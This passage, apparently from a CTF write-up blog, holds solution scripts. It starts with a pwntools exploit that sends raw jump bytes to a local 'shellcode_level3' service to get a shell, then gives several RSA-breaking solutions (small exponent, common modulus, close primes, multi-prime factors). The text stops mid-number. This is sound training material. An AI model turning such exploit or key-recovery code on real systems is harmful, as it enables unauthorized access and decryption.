<h3 id="shellcode-level3"><a href="#shellcode-level3" class="headerlink" title="shellcode_level3"></a>shellcode_level3</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs clean"># coding=utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *  <br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br># context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">34733</span>)<br>elf = ELF(<span class="hljs-string">&quot;./shellcode_level3&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc6_2.35-0ubuntu3_amd64.so&quot;</span>)<br><br><br>p.sendline(b<span class="hljs-string">&quot;\xE9\x48\xD1\xFF\xFF&quot;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h3 id="baby-e"><a href="#baby-e" class="headerlink" title="baby_e"></a>baby_e</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br><br>n = <span class="hljs-number">553409369582823237678532685244026647155180191225879439432235077135813123637186465008813830373646133388592395760175777499266561095087891764348044063111935877931069321764391883899483374576303169645488542398590564148654412004383012178107972880058460460806768779452529433458826925606225797078653905380530651390617109384086518728626571028089036812787671647095695947167204428442727185744172445701874820612799168887428075695751162763647868386879374037826876671079326544820609721731078985096813307183878793033824330869698508952853770794414757655681370862323768018291030331209143189638496644361618184164228294031490537429556439588954274708598530042700988138862000054458742762198052079867259365645914383561162796796952346445529346145323567650621600171442575319262718389389870407629339714751583360252884338116164466349449862781112019462555743429653595045695696967783338371470032332852204294900011651434678829104876529439166176589508898757122660322523937330848536715937381297551894198974459004139082562228022412335520195652419375915216074658463954339332593244483927157329404652516225481116614815221154229491846087288087715884363786672244655901308480290011237244562251084095684531716327141154558809471185132979704992609461470501119328696999713829</span><br>e = <span class="hljs-number">7</span><br>c = <span class="hljs-number">147693154873835354725007152781732424355869776162377337823960431913672366269917723916891506269449726723757821517328874729037838600793748824028829185409932536014732765063216715033843955453706710187792772702199448156372644163429786386035008302836467605094954587157232829525150652611067567669525072625329634860065850520051628272535479197120008981979404760445193750864902244921407742155742716289495581989134730376783828846663464819337418977287363028738701414486788851136608957124505485242331701209645216580641917007780811842757125048746184068597664780265422321550909392419865169775282217442331295071069272774722564587602419768461231775480847018941840911357926330143045826277813722919121117172763493242590521245640828462665947672485094793188432098216701511715232654611338293295459889814699850788048985878279440740712956248569068077253790198036918598519191892836075254345518967666166925163908185663991353344555402397055977817370082929420443034626201745027965444069777059760865359310439815816749939498993014457995041394803598825093836045546578310632172636478575946653375857640993393714607308326474003446154152048840071034349831168612740218034679021240949747357214453636633636662650940968576792518622437627529244515229173</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">n, e, c</span>):<br>    k = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        m1 = k * n + c<br>        m, t = gmpy2.iroot(m1, e)<br>        <span class="hljs-keyword">if</span> t:<br>            <span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br>            <span class="hljs-keyword">break</span><br>        k += <span class="hljs-number">1</span><br>exp(n, e, c)<br></code></pre></td></tr></table></figure>

<h3 id="bad-E"><a href="#bad-E" class="headerlink" title="bad_E"></a>bad_E</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br> <br>e = <span class="hljs-number">65537</span><br>p = <span class="hljs-number">11727544912613560398705401423145382428897876620077115390278679983274961030035884083100580422155496261311510530671232666801444557695190734596546855494472819</span><br>q = <span class="hljs-number">6853495238262155391975011057929314523706159020478084061020122347902601182448091015650787022962180599741651597328364289413042032923330906135304995252477571</span><br>c = <span class="hljs-number">63388263723813143290256836284084914544524440253054612802424934400854921660916379284754467427040180660945667733359330988361620691457570947823206385692232584893511398038141442606303536260023122774682805630913037113541880875125504376791939861734613177272270414287306054553288162010873808058776206524782351475805</span><br>n = p*q<br> <br>phi_n = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(GCD(e,q-<span class="hljs-number">1</span>))<br>d = gmpy2.invert(e,(p-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c,d,p)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure>

<h3 id="n-amp-n"><a href="#n-amp-n" class="headerlink" title="n&amp;n"></a>n&amp;n</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br><br>n= <span class="hljs-number">13612969130810965900902742090064423006385890357159609755971027204203418808937093492927060428980020085273603754747223030702684866992231913349067578014240319426522039068836171388168087260774376277346092066880984406890296520951318296354893551565670293486797637522297989653182109744864444697818991039473180752980752117041574628063002176339235126861152739066489620021077091941250365101779354009854706729448088217051728432010328667839532327286559570597994183126402340332924370812383312664419874352306052467284992411543921858024469098268800500500651896608097346389396273293747664441553194179933758992070398387066135330851531</span><br>e1= <span class="hljs-number">0x114514</span><br>e2= <span class="hljs-number">19198101</span><br>c1= <span class="hljs-number">5776799746376051463605370130675046329799612910435315968508603116759552095183027263116443417343895252766060748671845650457077393391989018107887540639775168897954484319381180406512474784571389477212123123540984850033695748142755414954158933345476509573211496722528388574841686164433315356667366007165419697987147258498693175698918104120849579763098045116744389310549687579302444264316133642674648294049526615350011916160649448726069001139749604430982881450187865197137222762758538645387391379108182515717949428258503254717940765994927802512049427407583200118969062778415073135339774546277230281966880715506688898978925</span><br>c2= <span class="hljs-number">4664955020023583143415931782261983177552050757537222070347847639906354901601382630034645762990079537901659753823666851165175187728532569040809797389706253282757017586285211791297567893874606446000074515260509831946210526182765808878824360460569061258723122198792244018463880052389205906620425625708718545628429086424549277715280217165880900037900983008637302744555649467104208348070638137050458275362152816916837534704113775562356277110844168173111385779258263874552283927767924979691542028126412133709129601685315027689094437957165812994784648540588277901241854031439324974562449032290219652206466731675967045633360</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp_def</span>(<span class="hljs-params">e1,e2,c1,c2,n</span>):<br>    s,s1,s2 = gmpy2.gcdext(e1, e2)<br>    m = (<span class="hljs-built_in">pow</span>(c1,s1,n) * <span class="hljs-built_in">pow</span>(c2 ,s2 ,n)) % n<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(m)<br><br>m=exp_def(e1,e2,c1,c2,n)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br></code></pre></td></tr></table></figure>
<h3 id="factor-signin"><a href="#factor-signin" class="headerlink" title="factor_signin"></a>factor_signin</h3><p>factordb</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">p1 = <span class="hljs-number">18055722101348711626577381571859114850735298658417345663254295930584841136416234624852520581982069555948490061840244710773146585295336094872892685938420880462305333393436098181186277450475949236132458958671804132443554885896037342335902958516394876382378829317303693655605215373555988755516058130500801822723195474873517960624159417903134580987202400855946137101429970119186394052011747475879598126195607938106163892658285305921071673588966184054026228745012993740035399652049777986535759039077634555909031397541116025395236871778797949216479130412500655359057128438928721459688727543057760739527720641179290282309741</span><br>q1 = <span class="hljs-number">19024691283015651666032297670418553586155390575928421823630922553034857624430114628839720683172187406577114034710093054198921843669645736474448836706112221787749688565566635453151716934583685087745112614898780150391513798368931496744574075511968933800467288441832780919514199410584786925010518564670786685241724643282580795568609339268652910564215887176803735675069372979560024792322029911970574914829712553975379661212645059271137916107885326625543090473004683836665262304916304580076748336858662108554591235698235221618061328251985929904075811056422186525179189846420226944944513865790999242309352900287977666792901</span><br>n1 = <span class="hljs-number">343504538870081878757729748260620800783581983635281373321527119223374418103340873199654926888439040391545101913132680017655039577253974802351999985470115474655124168592386965001556620077117966153475518658881140827499124290142523464795351995478153288872749817655925271395693435582010998996210909883510311066017237567799370371513462802547313382594409676803895262837061350017911885033133654781876923251129406855067993830824618637981136966134029212516871210627954762147349788788999116702635535406398258621926040887099782494271000823401788337120154104692934583729065189687995570122890809807661370008740283447636580308161498808092269041815719148127168137018600113465985504975054319601741498799761500526467431533990903047624407330243357514588557352746347337683868781554819821575385685459666842162355673947984514687068626166144076257334426612302554448774082488600083569900006274897032242821388126274957846236552373226099112200392102883351088570736254707966329366625911183721875374731791052229266503696334310835323523568132399330263642353927504971311717117370721838701629885670598853025212521537158141447625623337563164790788106598854822686494249848796441153496412236527242235888308435573209980270776407776277489669763803746640746378181948641</span><br>e = <span class="hljs-number">65537</span><br>c1 = <span class="hljs-number">10004937130983861141937782436252502991050957330184611684406783226971057978666503675149401388381995491152372622456604317681236160071166819028679754762162125904637599991943368450200313304999566592294442696755822585022667008378021280392976010576970877334159755332946926433635584313137140987588847077645814987268595739733550220882135750267567373532603503399428451548677091911410732474324157868011686641243202218731844256789044721309478991918322850448456919991540932206923861653518190974620161055008847475600980152660468279765607319838003177639654115075183493029803981527882155542925959658123816315099271123470754815045214896642428657264709805029840253303446203030294879166242867850331945166255924821406218090304893024711068773287842075208409312312188560675094244318565148284432361706108491327014254387317744284876018328591380705408407853404828189643214087638328376675071962141118973835178054884474523241911240926274907256651801384433652425740230755811160476356172444327762497910600719286629420662696949923799255603628210458906831175806791599965316549386396788014703044837917283461862338269599464440202019922379625071512100821922879623930069349084917919100015782270736808388388006084027673781004085620817521378823838335749279055639005125</span><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>d1 = gmpy2.invert(e,(p1-<span class="hljs-number">1</span>)*(q1-<span class="hljs-number">1</span>))<br>m1=<span class="hljs-built_in">pow</span>(c1,d1,n1)<br><br>c2 =  <span class="hljs-number">4948422459907576438725352912593232312182623872749480015295307088166392790756090961680588458629287353136729331282506869598853654959933189916541367579979613191505226006688017103736659670745715837820780269669982614187726024837483992949073998289744910800139692315475427811724840888983757813069849711652177078415791290894737059610056340691753379065563574279210755232749774749757141836708161854072798697882671844015773796030086898649043727563289757423417931359190238689436180953442515869613672008678717039516723747808793079592658069533269662834322438864456440701995249381880745586708718334052938634931936240736457181295</span><br>n2 =  <span class="hljs-number">8582505375542551134698364096640878629785534004976071646505285128223700755811329156276289439920192196962008222418309136528180402357612976316670896973298407081310073283979903409463559102445223030866575563539261326076167685019121804961393115251287057504682389257841337573435085535013992761172452417731887700665115563173984357419855481847035192853387338980937451843809282267888616833734087813693242841580644645315837196205981207827105545437201799441352173638172133698491126291396194764373021523547130703629001683366722885529834956411976212381935354905525700646776572036418453784898084635925476199878640087165680193737</span><br><br>n2b=[<span class="hljs-number">9949603102225364603</span>,<span class="hljs-number">10049235158029375571</span>,<span class="hljs-number">10547615587767500213</span>,<span class="hljs-number">10596280721192026229</span>,<span class="hljs-number">10864078180916418691</span>,<span class="hljs-number">11092420583960163379</span>,<span class="hljs-number">11853704782834170959</span>,<span class="hljs-number">12034779627328165471</span>,<span class="hljs-number">12404642343676224637</span>,<span class="hljs-number">12448177342966243757</span>,<span class="hljs-number">13062839684118954553</span>,<span class="hljs-number">13645878578452317313</span>,<span class="hljs-number">14397830993057803133</span>,<span class="hljs-number">14619040595108594017</span>,<span class="hljs-number">14678737767649343977</span>,<span class="hljs-number">14745811312384518031</span>,<span class="hljs-number">14813953870710226847</span>,<span class="hljs-number">15175734709842430433</span>,<span class="hljs-number">15211380502610462057</span>,<span class="hljs-number">15332916111580607077</span>,<span class="hljs-number">15751974537676958401</span>,<span class="hljs-number">16123604149048919099</span>,<span class="hljs-number">16408421615173973083</span>,<span class="hljs-number">16870346804576162551</span>,<span class="hljs-number">17093292308638969889</span>,<span class="hljs-number">17265001711647542137</span>,<span class="hljs-number">17289161209347211817</span>,<span class="hljs-number">17543713628803023199</span>,<span class="hljs-number">17673334943789572513</span>,<span class="hljs-number">18106525049998616747</span>,<span class="hljs-number">18345408081492711641</span>,<span class="hljs-number">18390046459144888243</span>]<br>phi2= <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> n2b:<br>    phi2 *= (i-<span class="hljs-number">1</span>)<br>d2=gmpy2.invert(e,phi2)<br>m2=<span class="hljs-built_in">pow</span>(c2,d2,n2)<br><span class="hljs-built_in">print</span>(long_to_bytes(m1)+long_to_bytes(m2))<br></code></pre></td></tr></table></figure>

<h3 id="p-q"><a href="#p-q" class="headerlink" title="|p-q|"></a>|p-q|</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>e=<span class="hljs-number">65537</span><br>c = <span class="hljs-number">307746143297103281117512771170735061509547958991947416701685589829711285274762039205145422734327595082350457374530975854337055433998982493020603245187129916580627539476324521854057990929173492940833073106540441902619425074887573232779899379436737429823569006431370954961865581168635086246592539153824456681688944066925973182272443586463636373955966146029489121226571408532284480270826510961605206483011204059402338926815599691009406841471142048842308786000059979977645988396524814553253493672729395573658564825709547262230219183672493306100392069182994445509803952976016630731417479238769736432223194249245020320183199001774879893442186017555682902409661647546547835345461056900610391514595370600575845979413984555709077635397717741521573798309855584473259503981955303774208127361309229536010653615696850725905168242705387575720694946072789441481191449772933265705810128547553027708513478130258801233619669699177901566688737559102165508239876805822898509541232565766265491283807922473440397456701500524925191214292669986798631732639221198138026031561329502985577205314190565609214349344303324429408234237832110076900414483795318189628198913032900272406887003325858236057373096880675754802725017537119549989304878960436575670784578550</span><br>n = <span class="hljs-number">329960318345010350458589325571454799968957932130539403944044204698872359769449414256378111233592533561892402020955736786563103586897940757198920737583107357264433730515123570697570757034221232010688796344257587359198400915567115397034901247038275403825404094129637119512164953012131445747740645183682571690806238508035172474685818036517880994658466362305677430221344381425792427288500814551334928982040579744048907401043058567486871621293983772331951723963911377839286050368715384227640638031857101612517441295926821712605955984000617738833973829140899288164786111118033301974794123637285172303688427806450817155786233788027512244397952849209700013205803489334055814513866650854230478124920442832221946442593769555237909177172933634236392800414176981780444770542047378630756636857018730168151824307814244094763132088236333995807013617801783919113541391133267230410179444855465611792191833319172887852945902960736744468250550722314565805440432977225703650102517531531476188269635151281661081058374242768608270563131619806585194608795817118466680430500830137335634289617464844004904410907221482919453859885955054140320857757297655475489972268282336250384384926216818756762307686391740965586168590784252524275489515352125321398406426217</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">factor</span>(<span class="hljs-params">n</span>):<br>    a = gmpy2.iroot(n, <span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        B2 = <span class="hljs-built_in">pow</span>(a, <span class="hljs-number">2</span>) - n<br>        <span class="hljs-keyword">if</span> gmpy2.is_square(B2):<br>            b = gmpy2.iroot(B2, <span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br>            p = a + b<br>            q = a - b<br>            <span class="hljs-keyword">return</span> p,q<br>        a += <span class="hljs-number">1</span>  <br><br><span class="hljs-comment">#print(factor(n))</span><br>p = <span class="hljs-number">18164809890142267890219276206773099235072154806950582020347085518282960761937147879570277730919110196557742226232054602784278585009762036923951358612733074768279344311938292845187804144458991947979616574535662033512236959010688698879953460760771547964758688700129994322153904156260452550830932232536673055480604083903327472696393017478985867846428177588049472509968031143243583420309569129756696755744088888618703553769561648077215188783123207031628505020478500655602448720006243614258852026797076054766680755124052134730998085155245587457870148748357237005392662882609410088994421984160941612734270140092780661013147</span><br>q = <span class="hljs-number">18164809890142267890219276206773099235072154806950582020347085518282960761937147879570277730919110196557742226232054602784278585009762036923951358612733074768279344311938292845187804144458991947979616574535662033512236959010688698879953460760771547964758688700129994322153904156260452550830932232536673055480604083903327472696393017478985867846428177588049472509968031143243583420309569129756696755744088888618703553769561648077215188783123207031628505020478500655602448720006243614258852026797076054766680755124052134730998085155245587457870148748357237005392662882609410088994421984160941612734270140092780661012811</span><br>d=gmpy2.invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure>

<h3 id="rsa-signin"><a href="#rsa-signin" class="headerlink" title="rsa_signin"></a>rsa_signin</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python">n1 = <span class="hljs-number">17524722204224696445172535263975543817720644608816706978363749891469511686943372362091928951563219068859089058278944528021615923888948698587206920445508493551162845371086030869059282352535451058203615402089133135136481314666971507135484450966505425514285114192275051972496161810571035753943880190780759479521486741046704043699838021850105638224212696697865987677760179564370167062037563913329993433080123575434871852732981112883423565015771421868680113407260917902892944119552200927337996135278491046562185003012971570532979090484837684759828977460570826320870379601193678304983534424368152743368343335213808684523217</span><br>c1 = <span class="hljs-number">6870605439714128574950893771863182370595667973241984289208050776870220326525943524507319708560433091378319367164606150977103661770065561661544375425887970907060665421562712515902428061727268441585629591525591001533188276465911918724808701356962871139957343861919730086334623932624184172272488406793955068827527130338853980609365042071290967556159598511667974987218999253443575482949258292953639729393456515185185102248985930422080581185292420347510600574229080211050520146551505605537486989306457793451086767402197128573781597156939709237045132856159368959981648969874765462190363842275826077556314448408825308218451</span><br>n2 = <span class="hljs-number">24974121071274650888046048586598797033399902532613815354986756278905133499432183463847175542164798764762683121930786715931063152122056911933710481566265603626437742951648885379847799327315791800670175616973945640322985175516271373004547752061826574576722667907302681961850865961386200909397231865804894418194711076667760169256682834206788730947602211228930301853348503098156592000286467190760378847541148772869356389938999094673945092387627113807899212568399028514283219850734634544982646070106811651490010946670117927664594365986238107951837041859682547029079035013475238052160645871718246031144694712586073789250183</span><br>c2 = <span class="hljs-number">10324627733161143472233272675096997859064721978612320424254305978486200326061730105384511258706433940176741256952824288120499229240005823611541292676234913505775165761543820764046537413943393325463602612485849366939102550336256797820440347815027443410399157963547486098366749815425187247171697678576246606105486928212486117878157055321965270364583625270716186820068538749425299073309429589410882809098930213978117176627031795312102177342499674234163614021182116065492884880492891668658240362567156235958605768725892407536211503981819707919444725863397622629226309480836486427388484176463279384813974310500625102568341</span><br>n3 = <span class="hljs-number">14215826065753265334521416948225868542990756976323308408298887797364519400310818641526401662106853573185085731682502059761982246604277475488691297554851873224516934619888327644352138127883043558424300092247604877819821625587944308487310522092440517150600171819145803937177931473336108429889165189521078678397694303305705260759351843006130968234071638035667854938070597400634242396852782331461576526836227336952718230741560369621645218729592233657856104560425642219241082727756696967324334634822771842625681505869025740662258929200756109704988223034840699133778958569054445520305361142302393767439478256174414187983763</span><br>c3 = <span class="hljs-number">415916446053083522663299405080903121619846594209033663622616979372099135281363175464579440520262612010099820951944229484417996994283898028928384268216113118778734726335389504987546718739928112684600918108591759061734340607527889972020273454098314620790710425294297542021830654957828983606433731988998097351888879368160881316237557097381718444193741788664735559392675419489952796677690968481917700683813252460912749931286739585465657312416977086336732056497161860235343155953578618273940135486362350057858779130960380833359506761436212727289297656191243565734621757889931250689354508999144817518599291078968866323093</span><br>n4 = <span class="hljs-number">12221355905532691305226996552124162033756814028292708728711809229588190407700199452617060657420166395065565154239801465361510672853972152857415394695376825120759202857555325904640144375262531345320714166285999668052224661520834318497234299585219832943519644095197479639328120838919035625832361810964127485907587199925564724081163804724975965691571850962714258888527902920462746795712011579424322515292865504642938090200503979483095345893697972170153990274670257331483858538617460680462369680572833191232126527727222302641204529110948993583190295067970240051042000918629138767209918572311469915774910003970381965123241</span><br>c4 = <span class="hljs-number">2248834602646305164283014556051672824689884721514190813323189875541899566338153534858709617544459297836048770439230174669883719627734394673012731609952869246171300132019334542245094425654362711870373095782083791160029789553806741967408922001051006100049326921742208757147339981269528740944842177729701945606827918253016001436218891580980192743564642120923356793292885805519110411357830040053435569937296612987581482128241218218550319154933831743819546558930918761162723110000328532730751591375727881221199739397698390594797621758011191224528339478784930214820615602510460640307707682865125229937141010351138099874025</span><br>n5 = <span class="hljs-number">18152103454920389919231636321286527841833809319334215885641536161086810144890443857211776387914779781628740172079478910188540146498426564211851629962338413488555121865779016981727229209606498886170396500155102635962395243364899026418106378234307821492609778555173516000309435730752571818439328803899462791834490025768785383592935046996428331508608555503567191807692523852530836008436655164751054189301721070209363416058642811329040202582026786024825518381761299547703962502636888833428457116986351812252188468878701301184044948733274488264320930936362549028124581962244201377136969591119942276742760215403738913067567</span><br>c5 = <span class="hljs-number">2797812094994121597295362327809389195134238119144547570610194659000554967367804835006774413888965325870488368112707535584687083342412367127561646136089638402907513075405746055834487062923240856950047936297155455745928810738711368950139327254040579266046642851362228893522740216519732851152162928545416236075387903789535000820423985522550638100049857678600662008021574841083416323980817348573062083159710189689337626277009675683473560325178417766400002763719953723259300977655801234386662217462862844994462505601804422871991694828697337752697234180117437785537788728412520613916334045368736691714704501962513954509705</span><br>n6 = <span class="hljs-number">22877887459293720334652698748191453972019668578065068224653972884599636421200068659750242304040301306798039254241668648594556654589309801728248683586229288074709849246660525799452637187132633064172425677552176203292787732404537215347782229753837476655088638984496409603054524994383358547132112778403912563916886533181616856401929346567686400616307916690806467019665390260267596320840786982457521423178851498130935577260638269429250197050326097193841333205073650802709022947551398142692735680419453533128176592587955634333425401930362881423044363132586170013458300714163531162544301477356808388416864173949089028317961</span><br>c6 = <span class="hljs-number">12271947322974809255127222556723394446467844330408506340843897575503534175121932185624776713618037572593449207329510171212097269297133492090526270770286000839978630002819714376964416081198925899119135271459404333829811516667576167576916805217016117373027245648473458331936273975110163065432285322832123169216976420362833557809289561705091817949915218278430834098156335989014645979633658818904753942786129126233956314517292746008579152368541316795082120147520597254020266752859205131887527661767589367756335766220841483940854397440079467053684289006956034944336788288196391829411432383541473132962783883758561108297747</span><br>n7 = <span class="hljs-number">19844333358004073542783728196775487079202832688982038135532362073659058674903791697765527614270399097276261983744620537925712167578187109058145015032736796457938148615396547198728652435169126585595701228287449135664667959433491335769206692390262797325133960778920452511673878233190120432257482339068405290918739453464061987163074129048150451046315248186376609350095502130018696275764450248681787926130463463923862832714969425813770847493135627599129546112143050369344208092649256659330284904392961574494907186727388685504929586018639846040474616307662546605623294842316524163106100888851228858194942825157286544846177</span><br>c7 = <span class="hljs-number">9531264751315473345056673937611382755236533664089452852716992791452558274873158812669513178040971923528201631609089069182049526587423864397527252061341857426422965190913745048414029690931254119437249218321954899956104589066479231204536856131403590472063496956452030342299863907499976917750846369802185896519725837163530049157920978007252920334447236842959033879772444475877613295594785710745889554296655932909212643500877218304116451889820444820534937901427158918411546484157737612926382420354101675658160847653151539420222526999426483473829341628599881460824765758346670633385844187252696874025582747177333702736465</span><br>n8 = <span class="hljs-number">16956880944655068255446705024149899655327230949463546092744762226005904114738078692036960935391303255804754787864713189658290361949509917704853428701870609882427423574672772606814823959758208695540116440342488334213300943604780971422918744381486937517952553797134323570131582724393100092308466968491068503301604506186521656059375518680612292667310641047190088814753025794048591445267711939066523165042651430468971452726568222388482323097260496415484997546126185688914792795834046855221759289007609518312601640548469651358391745947588643697900883634533872314566389446271647587564348026861264979727062157272541149018781</span><br>c8 = <span class="hljs-number">16110326928338602237561005337578085623028116490564329920738844771341250444164294693848130674347672763073995755532723894042946521372321947507527854966013459795492930736187058535665041545095683801386814190612817128504426590828954205050425979880047802547011117626354405687170961272200066258220699329112978151044633994329352673342582175349200008181837211288847301836681860817044391028992501763375849046751094019224570802498414368189170656992427042010362385494565216988561215657424755648213390551881450141899860811844684546992754530755092358644968088017107313907435586729574798046187046145596726569637758312033849476689378</span><br>n9 = <span class="hljs-number">16472195897077185060734002588086375750797253422014472876266294484788862733424113898147596402056889527985731623940969291811284437034420929030659419753779530635563455664549165618528767491631867637613948406196511848103083967995689432928779805192695209899686072900265108597626632371718430059561807147486376536203800038054012500244392964187780217667805308512187849789773573138494622201856638931435423778275004491853486855300574479177472267767506041000072575623287557610576406578525902565241580838652860552046216587141709709405062150243990097835181557208274750462554811004137033087430556692966525170882625891516050207318491</span><br>c9 = <span class="hljs-number">11867731823522211833301190385669833752050387304375114576570892885641949969365352586215693183003550684262313893105989683214739695968039039944442567581277252581988489020834299896625977474857889570528169919064941042132119301236852358823696947330423679033138054012027878783478922023431469564210485180679933264749281963405243082505688901662659030897104957499953192201440290084373968716271056483463909282407034181891901928790601973222643210525000717355062752079302291729448234374709852429885984987094307177760741403086538949190424454337896501402430653783597070178968921411867485584517214777073301007918941216316241784521708</span><br>n10 = <span class="hljs-number">13890749889361612188368868998653029697326614782260719535555306236512452110708495623964530174188871342332417484996749651846510646453983388637377706674890018646246874688969342600780781646175634455109757266442675502522791531161284420286435654971819525519296719668701529481662071464145515727217108362496784024871976015116522898184301395037566514980846499856316532479656908169681719288258287756566886281183699239684997698487409138330229321935477734921670373632304542254938831218652340699024011371979519574576890581492623709896310465567043899767342676912434857372520308852745792360420376574037705943820090308501053778144141</span><br>c10 = <span class="hljs-number">6250115196713939477947942995075509357173312813431601073354390451609559579925704891503987992181988654989477525811826607070378476102616752398280691012244301950194800995432882828020405062344160270290542566163969692748126314259624623341922057435728127596172871894887055305291345372720594481096374310285437492746765510292863238933163142677773310305789984897974266961231555124787205980411992251387207335655129551950825339766848166539671565212408741432649813058363660321480995187545006718837863674527475323414266732366507905974800565463011676462244368010182725161416783875646259625352308599198614681446394427674340328493047</span><br>n11 = <span class="hljs-number">21457499145521259498911107987303777576783467581104197687610588208126845121702391694574491025398113729462454256070437978257494064504146718372095872819969887408622112906108590961892923178192792218161103488204912792358327748493857104191029765218471874759376809136402361582721860433355338373725980783308091544879562698835405262108188595630215081260699112737457564998798692048522706388318528370551365364702529068656665853097899157141017378975007689790000067275142731212069030175682911154288533716549782283859340452266837760560153014200605378914071410125895494331253564598702942990036163269043699029806343766286247742865671</span><br>c11 = <span 